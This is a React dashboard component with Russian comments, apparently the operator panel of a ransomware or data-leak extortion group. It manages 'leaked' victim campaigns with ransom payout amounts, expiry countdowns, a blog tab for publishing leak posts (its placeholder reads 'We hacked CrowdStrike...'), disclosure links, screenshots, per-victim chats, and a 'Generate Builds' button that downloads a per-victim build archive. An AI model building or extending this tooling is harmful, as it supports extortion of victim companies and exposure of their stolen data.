import React, { useEffect, useState } from "react";
import {
  Table,
  Card,
  Tabs,
  Descriptions,
  Button,
  Form,
  Input,
  Upload,
  Select,
  message,
  Space,
  Popconfirm,
  DatePicker,
  Tag,
} from "antd";
import type { ColumnsType } from "antd/es/table";
import {
  PlusOutlined,
  DeleteOutlined,
  UploadOutlined,
  ReloadOutlined,
  EyeOutlined,
} from "@ant-design/icons";
import axios from "axios";

import { AppSettings } from "@/shared/const/appSettings";
import { ChatsWithTabs } from "../ChatPage/ChatsWithTabs";
import dayjs from "dayjs";

const { Option } = Select;
const { TabPane } = Tabs;
const { TextArea } = Input;

interface Screenshot {
  id: number;
  image_url: string;
}

interface UrlItem {
  id: number;
  url: string;
}

interface User {
  user_id: number;
  id: number;
  name: string;
  login: string;
  role_id: number;
  status_id: number;
}

interface Campaign {
  id: number;
  status: number;
  blog: string;
  created_at: string;
  description?: string;
  website: string;
  user?: User;
  expires: dayjs.Dayjs;
  logo_url?: string;
  screenshots: Screenshot[];
  urls: UrlItem[];
  payout?: number;
  payout_unit?: number;
  builder: number;
  company_name?: string; // В JSON встречается как company_name
  lastLogin?: string;    // Иногда бывает
  publish?: number;
  is_accept: number;
}

const CampaignsDashboard: React.FC = () => {
  const [campaigns, setCampaigns] = useState<Campaign[]>([]);
  const [selectedCampaign, setSelectedCampaign] = useState<Campaign | null>(null);

  const [isViewMode, setIsViewMode] = useState(false);

  const [activeCardTab, setActiveCardTab] = useState<string>("1");

  const [form] = Form.useForm();

  // "Create Blog" tab:
  const [createBlogForm] = Form.useForm();

  // Локальные состояния для вкладки "Create Blog"
  const [disclosures, setDisclosures] = useState<UrlItem[]>([]);
  const [localLogoUrl, setLocalLogoUrl] = useState<string>("");
  const [localScreenshots, setLocalScreenshots] = useState<Screenshot[]>([]);

  const [user, setUser] = useState<User | null>(null);

  // ==============================
  // 1) Загрузка списка кампаний
  // ==============================
  const fetchCampaigns = async () => {
    try {
      // Исправляем URL: /campaign
      console.log(`${AppSettings.API_URL}`);
      const response = await fetch(`${AppSettings.API_URL}/campaign`, {
        credentials: "include",
        method: "GET"
      });
      if (!response.ok) throw new Error("Failed to fetch campaigns");
      const data: Campaign[] = await response.json();
      setCampaigns(data);
    } catch (error) {
      console.error("Error fetching campaigns:", error);
      message.error("Failed to fetch campaigns.");
    }
  };

    useEffect(() => {
      // Example: fetch current user data
      fetch("/api/auth/me", {
        method: "GET",
        credentials: "include",
      })
        .then(async (res) => {
          if (res.ok) {
            const data = await res.json();
            setUser(data);
          } else {
            setUser(null);
          }
        })
        .catch(() => {
          setUser(null);
        });
    }, []);

  useEffect(() => {
    fetchCampaigns();
  }, []);

  // ==============================
  // 2) Обработка клика по строке
  // ==============================
  const handleRowClick = (record: Campaign) => {
    record.expires = dayjs(record.expires)
    setSelectedCampaign(record);
    setActiveCardTab("1");
  };

  // ==============================
  // Модальные окна (Add/Edit/View)
  // ==============================
  const handleAddCampaign = () => {
    // Полностью сбрасываем формы/состояния
    setSelectedCampaign(null);
    setIsViewMode(false);
    form.resetFields();
    createBlogForm.resetFields();
    setLocalLogoUrl("");
    setLocalScreenshots([]);
    setDisclosures([]);
  };

  // const handleEditCampaign = (record: Campaign) => {
  //   setSelectedCampaign(record);
  //   setIsViewMode(false);
  //   setIsModalVisible(true);
  //   // Заполним форму Edit значениями
  //   fillEditForm(record);
  // };

  // const handleViewCampaign = (record: Campaign) => {
  //   setSelectedCampaign(record);
  //   setIsViewMode(true);
  //   setIsModalVisible(true);
  //   fillEditForm(record);
  // };

  const handleDeleteCampaign = async (id: number) => {
    try {
      // Добавляем baseUrl
      const response = await fetch(`${AppSettings.API_URL}/leakeds/${id}`, {
        method: "DELETE",
        credentials: "include",
      });
      if (!response.ok) throw new Error("Failed to delete campaign");
      message.success("Deleted successfully");
      fetchCampaigns();
    } catch (error) {
      console.error("Error deleting campaign:", error);
      message.error("Error deleting campaign");
    }
  };

  // Заполняем формы при выборе кампании
  useEffect(() => {
    if (selectedCampaign) {
      fillEditForm(selectedCampaign);
      fillBlogForm(selectedCampaign);
    } else {
      form.resetFields();
      createBlogForm.resetFields();
      setLocalLogoUrl("");
      setLocalScreenshots([]);
      setDisclosures([]);
    }
  }, [selectedCampaign]);

  // Универсальная функция для заполнения editForm
  function fillEditForm(c: Campaign) {
    form.setFieldsValue({
      website: c.website || "",
      // Делаем expiration -> moment, если есть
      expiration: c.expires ? dayjs(c.expires) : null,
  
      payout_value: c.payout || 0,
      payout_unit: c.payout_unit?.toString() ?? "0",
    });
  }

  // ==============================
  // Сохранение (Add/Edit) — в модалке
  // ==============================
  const handleSave = async () => {
    try {
      // Получаем значения из формы редактирования
      const mainValues = form.getFieldsValue();
      // Получаем значения из формы блога
      // Если нужно, можно провести валидацию createBlogForm, но можно и просто получить их.
      const blogValues = createBlogForm.getFieldsValue();
  
      const expiresStr = mainValues.expiration
        ? mainValues.expiration.toISOString()
        : null;
  
      // Собираем полный объект данных для отправки,
      // объединяя данные из обеих форм.
      let fullPayload = {
        id: selectedCampaign ? selectedCampaign.id : 0,
        status: selectedCampaign ? selectedCampaign.status : 0,
        blog: blogValues.blogText || selectedCampaign?.blog || "",
        created_at: selectedCampaign
          ? selectedCampaign.created_at
          : new Date().toISOString(),
        // Берём company_name либо из основной формы, либо из блога, если необходимо
        company_name:
          blogValues.blogCompanyName ||
          selectedCampaign?.company_name ||
          "",
        description:
          blogValues.blogDescription ||
          selectedCampaign?.description ||
          "",
        website: mainValues.website || null,
        user: { id: user?.user_id },
        expires: expiresStr,
        logo_url: localLogoUrl, // Лого теперь отправляется
        screenshots: localScreenshots, // Отправляем загруженные скриншоты
        urls: disclosures, // Отправляем disclosure ссылки
        payout: Number(mainValues.payout_value || 0),
        payout_unit: Number(mainValues.payout_unit || 0),
        is_accept: selectedCampaign?.is_accept || 2,
        publish: expiresStr != "" ? 0 : (selectedCampaign?.publish || 0)
      };
  
      console.log("Sending payload:", JSON.stringify(fullPayload, null, 2));
  
      const method = selectedCampaign ? "PUT" : "POST";
      const endpoint = selectedCampaign
        ? `${AppSettings.API_URL}/leakeds/${selectedCampaign.id}`
        : `${AppSettings.API_URL}/campaign`;
  
      const response = await fetch(endpoint, {
        method,
        headers: { "Content-Type": "application/json" },
        credentials: "include",
        body: JSON.stringify(fullPayload),
      });
  
      if (!response.ok) {
        throw new Error("Failed to save data");
      }
  
      message.success(
        selectedCampaign ? "Campaign updated successfully" : "Campaign added successfully"
      );
      fetchCampaigns();
    } catch (error) {
      console.error("Error saving leak:", error);
      message.error("Error saving leak");
    }
  };

  // ==============================
  // Логика вкладки "Create Blog" (в карточке)
  // ==============================
  // const resetBlogTab = (item: Campaign | null) => {
  //   if (!item) {
  //     blogForm.resetFields();
  //     setLocalLogoUrl("");
  //     setLocalScreenshots([]);
  //     setDisclosures([]);
  //     return;
  //   }
  //   fillBlogForm(item);
  // };

  function fillBlogForm(c: Campaign) {
    createBlogForm.setFieldsValue({
      blogCompanyName: c.company_name || "",
      blogDescription: c.description || "",
      blogText: c.blog || "",
      // Если нужно, здесь можно ещё что-то заполнить
    });
    setLocalLogoUrl(c.logo_url || "");
    setLocalScreenshots(c.screenshots || []);
    setDisclosures(c.urls || []);
  }

  const addDisclosure = () => {
    setDisclosures((prev) => [...prev, { id: Date.now(), url: "" }]);
  };

  const updateDisclosure = (id: number, value: string) => {
    setDisclosures((prev) =>
      prev.map((item) => (item.id === id ? { ...item, url: value } : item))
    );
  };

  const removeDisclosure = (id: number) => {
    setDisclosures((prev) => prev.filter((item) => item.id !== id));
  };

  const handleRemoveScreenshot = (scrId: number) => {
    setLocalScreenshots((prev) => prev.filter((s) => s.id !== scrId));
  };

  // Загрузка логотипа
  const handleLogoUpload = {
    customRequest: async (options: any) => {
      const { file, onSuccess, onError } = options;
      const formData = new FormData();
      formData.append("file", file);

      try {
        const res = await axios.post(
          `${AppSettings.API_URL}/upload`,
          formData,
          {
            headers: { "Content-Type": "multipart/form-data" },
          }
        );
        const data = res.data;
        if (data.success === 1 && data.files?.length > 0) {
          setLocalLogoUrl(data.files[0].url);
        }
        onSuccess && onSuccess(data, file);
      } catch (error) {
        onError && onError(error);
      }
    },
  };

  // Загрузка скриншотов
  const handleScreenshotUpload = {
    customRequest: async (options: any) => {
      const { file, onSuccess, onError } = options;
      const formData = new FormData();
      formData.append("file", file);

      try {
        const res = await axios.post(
          `${AppSettings.API_URL}/upload`,
          formData,
          {
            headers: { "Content-Type": "multipart/form-data" },
          }
        );
        const data = res.data;
        if (data.success === 1 && data.files?.length > 0) {
          const uploadedScreens = data.files.map((f: any) => ({
            id: Date.now(),
            image_url: f.url,
          }));
          setLocalScreenshots((prev) => [...prev, ...uploadedScreens]);
        }
        onSuccess && onSuccess(data, file);
      } catch (error) {
        onError && onError(error);
      }
    },
  };

  // Publish Blog
  const handlePublishBlog = async () => {
    if (!selectedCampaign) return;
    try {
      const values = await createBlogForm.validateFields();
      const updatedCampaign: Campaign = {
        ...selectedCampaign,
        company_name: values.blogCompanyName || "",
        description: values.blogDescription || "",
        blog: values.blogText || "",
        logo_url: localLogoUrl,
        screenshots: localScreenshots,
        urls: disclosures,
        is_accept: 0,
      };

      const response = await fetch(
        `${AppSettings.API_URL}/leakeds/${selectedCampaign.id}`,
        {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          credentials: "include",
          body: JSON.stringify(updatedCampaign),
        }
      );
      if (!response.ok) {
        throw new Error("Failed to publish blog updates.");
      }
      message.success("Blog published successfully!");
      fetchCampaigns();
    } catch (error: any) {
      message.error("Error publishing blog: " + error.message);
      console.error(error);
    }
  };

  // ==============================
  // 3) Кнопка Generate Builds
  // ==============================
  const [isGenerating, setIsGenerating] = useState(false);

  const handleGenerateBuilds = async () => {
    if (!selectedCampaign) {
      message.error("No campaign selected!");
      return;
    }

    // Ставим builder = 1
    selectedCampaign.builder = 1;

    setIsGenerating(true);
    try {
      const response = await fetch(`${AppSettings.API_URL}/generate_archive`, {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          leaked_id: selectedCampaign.id,
          company_name: selectedCampaign.company_name,
        }),
      });

      if (!response.ok) throw new Error("Failed to generate build");

      const blob = await response.blob();

      const downloadUrl = window.URL.createObjectURL(blob);

      // Пытаемся получить имя файла
      const disposition = response.headers.get("Content-Disposition");
      let fileName = "archive.zip";
      if (disposition && disposition.includes("filename=")) {
        const match = disposition.match(/filename="([^"]+)"/);
        if (match && match[1]) {
          fileName = match[1];
        }
      }

      const link = document.createElement("a");
      link.href = downloadUrl;
      link.download = fileName;
      document.body.appendChild(link);
      link.click();

      link.remove();
      window.URL.revokeObjectURL(downloadUrl);

      message.success("Build generated successfully!");
    } catch (error) {
      console.error(error);
      message.error("Error generating builds");
    } finally {
      setIsGenerating(false);
    }
  };

  // ==============================
  // Колонки таблицы
  // ==============================
  const columns: ColumnsType<Campaign> = [
    {
      title: "Logo",
      dataIndex: "logo_url",
      key: "logo_url",
      render: (_, c: Campaign) => (
        c.logo_url ? (
          <img style={{ maxWidth: "80px" }} src={c.logo_url} alt="logo" />
        ) : <span>No logo</span>
      ),
      width: "100px",
    },
    {
      title: "Company",
      dataIndex: "website",
      key: "website",
      render: (_, c: Campaign) =>
        `${c.website} ${c.company_name ? `(${c.company_name})` : ""}`,
    },
    {
      title: "Status",
      dataIndex: "status",
      key: "status",
      render: (_, c: Campaign) =>
        c.status ? (
          <span style={{ color: "green" }}>Active</span>
        ) : (
          <span style={{ color: "red" }}>Locked</span>
        ),
    },
    {
      title: "Blog",
      dataIndex: "is_accept",
      key: "is_accept",
      render: (_, c: Campaign) => {
        let statusText = "";
        let color = "";
    
        switch (c.is_accept) {
          case 0:
            statusText = "Pending";
            color = "orange";
            break;
          case -1:
            statusText = "Rejected";
            color = "red";
            break;
          case 1:
            statusText = "Accepted";
            color = "green";
            break;
          case 2:
            statusText = "Draft";
            color = "gray";
            break;
          default:
            statusText = "Unknown";
            color = "gray";
        }
    
        return <Tag color={color}>{statusText}</Tag>;
      },
    },
    {
      title: "Expire",
      dataIndex: "expires",
      key: "expires",
    },
    {
      title: "Created",
      dataIndex: "created_at",
      key: "created_at",
    },
    {
      title: "Actions",
      key: "actions",
      render: (_, record) => (
        <Space>
           <Button
            icon={<EyeOutlined />}
            onClick={(e) => {
              e.stopPropagation();
              handleRowClick(record);
            }}
          /> 
          {/* <Button
            icon={<EditOutlined />}
            onClick={(e) => {
              e.stopPropagation();
              handleEditCampaign(record);
            }}
          /> */}
          <Popconfirm
            title="Confirm delete?"
            onConfirm={(e) => {
              e?.stopPropagation();
              handleDeleteCampaign(record.id);
            }}
          >
            <Button danger icon={<DeleteOutlined />} />
          </Popconfirm>
        </Space>
      ),
    },
  ];

  // Счётчик времени до истечения (пример)
  const [timeRemaining, setTimeRemaining] = useState<string>("");

  useEffect(() => {
    if (selectedCampaign?.expires) {
      const expiryTime = selectedCampaign.expires.date();
      if (isNaN(expiryTime)) {
        setTimeRemaining("Invalid date");
        return;
      }
      const updateTime = () => {
        const now = new Date().getTime();
        const diff = expiryTime - now;
        if (diff > 0) {
          const days = Math.floor(diff / (1000 * 60 * 60 * 24));
          const hours = Math.floor(
            (diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
          );
          const minutes = Math.floor(
            (diff % (1000 * 60 * 60)) / (1000 * 60)
          );
          const seconds = Math.floor((diff % (1000 * 60)) / 1000);
          setTimeRemaining(`${days}d : ${hours}h : ${minutes}m : ${seconds}s`);
        } else {
          setTimeRemaining("Expired");
        }
      };

      updateTime();
      const interval = setInterval(updateTime, 1000);
      return () => clearInterval(interval);
    }
  }, [selectedCampaign]);

  return (
    <div style={{ padding: 24 }}>
      <Space>
        <Button
          type="primary"
          icon={<PlusOutlined />}
          onClick={handleAddCampaign}
          style={{ marginBottom: 16, background: 'rgb(0, 150, 20)' }}
        >
          Add Campaign
        </Button>
        <Button
          type="primary"
          icon={<ReloadOutlined />}
          onClick={fetchCampaigns}
          style={{ marginBottom: 16, background: 'rgb(17, 182, 39)' }}
        >
          Refresh
        </Button>
      </Space>


      <Table
        columns={columns}
        dataSource={campaigns}
        onRow={(record) => ({
          onClick: () => handleRowClick(record),
        })}
        rowKey="id"
      />

      {selectedCampaign && (
        <>
          <center>Expires: {timeRemaining}</center>
          <Card title={selectedCampaign.company_name} style={{ marginTop: 24 }}>
            <Tabs
              activeKey={activeCardTab}
              onChange={setActiveCardTab}
              defaultActiveKey="1"
            >
              <TabPane tab="Overview" key="1" disabled={!selectedCampaign}>
                {selectedCampaign ? (
                  <Descriptions bordered column={1} size="small">
                    <Descriptions.Item label="ID">{selectedCampaign.id}</Descriptions.Item>
                    <Descriptions.Item label="Company Name">
                      {selectedCampaign.company_name}
                    </Descriptions.Item>
                    <Descriptions.Item label="Description">
                      {selectedCampaign.description}
                    </Descriptions.Item>
                    <Descriptions.Item label="Expires">
                      {selectedCampaign.expires
                        ? selectedCampaign.expires.toLocaleString()
                        : "N/A"}
                    </Descriptions.Item>
                    <Descriptions.Item label="Payout">
                      {selectedCampaign.payout} ({["K", "M", "B"][selectedCampaign.payout_unit || 0] || "?"})
                    </Descriptions.Item>
                    <Descriptions.Item label="Created At">
                      {new Date(selectedCampaign.created_at).toLocaleString()}
                    </Descriptions.Item>
                    <Descriptions.Item label="Logo URL">
                      {selectedCampaign.logo_url ? (
                        <img
                          src={selectedCampaign.logo_url}
                          alt="Logo"
                          style={{ maxWidth: 200 }}
                        />
                      ) : (
                        "N/A"
                      )}
                    </Descriptions.Item>
                    <Descriptions.Item label="URLs">
                      {selectedCampaign.urls?.length > 0 ? (
                        <ul>
                          {selectedCampaign.urls.map((u) => (
                            <li key={u.id}>
                              <a href={u.url} target="_blank" rel="noreferrer">
                                {u.url}
                              </a>
                            </li>
                          ))}
                        </ul>
                      ) : (
                        "No URLs"
                      )}
                    </Descriptions.Item>
                    {selectedCampaign.screenshots?.length > 0 && (
                      <Descriptions.Item label="Screenshots">
                        {selectedCampaign.screenshots.map((scr) => (
                          <img
                            key={scr.id}
                            src={scr.image_url}
                            alt="Screenshot"
                            style={{ width: 120, marginRight: 8 }}
                          />
                        ))}
                      </Descriptions.Item>
                    )}
                  </Descriptions>
                ) : (
                  <p>No data to show.</p>
                )}
              </TabPane>

              {/* 2) Builder с кнопкой Generate Builds */}
              <TabPane tab="Builder" key="2">
                <Button
                  type="primary"
                  onClick={handleGenerateBuilds}
                  loading={isGenerating}
                  disabled={Boolean(selectedCampaign.builder) || isGenerating}
                >
                  Generate Builds
                </Button>
              </TabPane>

              <TabPane tab="Edit" key="edit" disabled={isViewMode}>
                <Form form={form} layout="vertical">
                  <Form.Item label="Website" name="website">
                    <Input placeholder="E.g. https://example.com" />
                  </Form.Item>
    
                  <Form.Item label="Expiration" name="expiration">
                  <DatePicker
                    showTime
                    // onChange={(date, dateString) => {
                    //   form.setFieldsValue({ publish_date: date })
                    // }}
                    format="YYYY-MM-DD HH:mm:ss"
                    style={{ width: '100%' }}
                  />
                  </Form.Item>
    
                  <Form.Item label="Target Payout (USD)">
                    <Space>
                      <Form.Item
                        name="payout_value"
                        noStyle
                        rules={[{ pattern: /^[0-9]*$/, message: "Must be a number" }]}
                      >
                        <Input style={{ width: 100 }} placeholder="Amount" />
                      </Form.Item>
                      <Form.Item name="payout_unit" noStyle initialValue="0">
                        <Select style={{ width: 80 }}>
                          <Option value="0">K</Option>
                          <Option value="1">M</Option>
                          <Option value="2">B</Option>
                        </Select>
                      </Form.Item>
                    </Space>
                  </Form.Item>
                </Form>
              </TabPane>

              <TabPane tab="Create Blog" key="blog" disabled={isViewMode}>
                <Form layout="vertical" form={createBlogForm}>
                  <Form.Item
                    label="Company Name"
                    name="blogCompanyName"
                    rules={[{ required: true, message: "Please enter company name!" }]}
                  >
                    <Input />
                  </Form.Item>
    
                  <Form.Item label="Logo">
                    {localLogoUrl ? (
                      <div>
                        <img
                          src={localLogoUrl}
                          alt="Current Logo"
                          style={{ maxWidth: 200, display: "block", marginBottom: 8 }}
                        />
                        <Button
                          danger
                          onClick={() => setLocalLogoUrl("")}
                          style={{ marginBottom: 8 }}
                        >
                          Remove Logo
                        </Button>
                      </div>
                    ) : (
                      <Upload {...handleLogoUpload}>
                        <Button icon={<UploadOutlined />}>Upload Logo</Button>
                      </Upload>
                    )}
                  </Form.Item>
    
                  <Form.Item label="Description" name="blogDescription">
                    <TextArea rows={3} placeholder="Enter short description..." />
                  </Form.Item>
    
                  <Form.Item label="Blog" name="blogText">
                    <TextArea rows={5} placeholder="We hacked CrowdStrike..." />
                  </Form.Item>
    
                  {/* Disclosures */}
                  <Form.Item label="Disclosures">
                    <Button
                      type="dashed"
                      onClick={addDisclosure}
                      style={{ marginBottom: 8 }}
                    >
                      + Add Disclosure Link
                    </Button>
                    {disclosures.map((d) => (
                      <Space key={d.id} style={{ display: "flex", marginBottom: 8 }}>
                        <Input
                          style={{ width: "500px" }}
                          placeholder="Enter disclosure link"
                          value={d.url}
                          onChange={(e) => updateDisclosure(d.id, e.target.value)}
                        />
                        <Button
                          danger
                          icon={<DeleteOutlined />}
                          onClick={() => removeDisclosure(d.id)}
                        />
                      </Space>
                    ))}
                  </Form.Item>
    
                  {/* Screenshots */}
                  <Form.Item label="Screenshots">
                    <Upload {...handleScreenshotUpload} multiple showUploadList={false}>
                      <Button icon={<UploadOutlined />}>Upload Screenshots</Button>
                    </Upload>
    
                    {/* Галерея загруженных скриншотов */}
                    <div style={{ marginTop: 16, display: "flex", flexWrap: "wrap", gap: 12 }}>
                      {localScreenshots.map((s) => (
                        <div
                          key={s.id}
                          style={{
                            position: "relative",
                            width: 100,
                            height: 100,
                            borderRadius: 8,
                            overflow: "hidden",
                            boxShadow: "0 4px 8px rgba(0, 0, 0, 0.1)",
                            transition: "transform 0.2s",
                          }}
                        >
                          {/* Увеличение при наведении */}
                          <img
                            src={s.image_url}
                            alt="Screenshot"
                            style={{
                              width: "100%",
                              height: "100%",
                              objectFit: "cover",
                              borderRadius: 8,
                              cursor: "pointer",
                            }}
                          />
    
                          {/* Кнопка удаления в правом верхнем углу */}
                          <Button
                            type="text"
                            danger
                            size="small"
                            icon={<DeleteOutlined />}
                            onClick={() => handleRemoveScreenshot(s.id)}
                            style={{
                              position: "absolute",
                              top: 4,
                              right: 4,
                              backgroundColor: "rgba(0,0,0,0.6)",
                              color: "white",
                              borderRadius: "50%",
                              width: 24,
                              height: 24,
                              display: "flex",
                              alignItems: "center",
                              justifyContent: "center",
                            }}
                          />
                        </div>
                      ))}
                    </div>
                  </Form.Item>
                  <Form.Item>
                    <Button type="primary" onClick={handlePublishBlog}>
                      Publish
                    </Button>
                  </Form.Item>
                </Form>
              </TabPane>
              <TabPane tab="Chats" key="5">
                <ChatsWithTabs leaked_id={selectedCampaign.id} />
              </TabPane>
            </Tabs>
            {/* Кнопка "Save" для вкладки "Edit" в карточке */}
            <Button
              key="save"
              type="primary"
              style={{ marginTop: "25px", float: "right" }}
              onClick={handleSave}
            >
              Save
            </Button>
          </Card>
        </>
      )}
    </div>
  );
};

export default CampaignsDashboard;
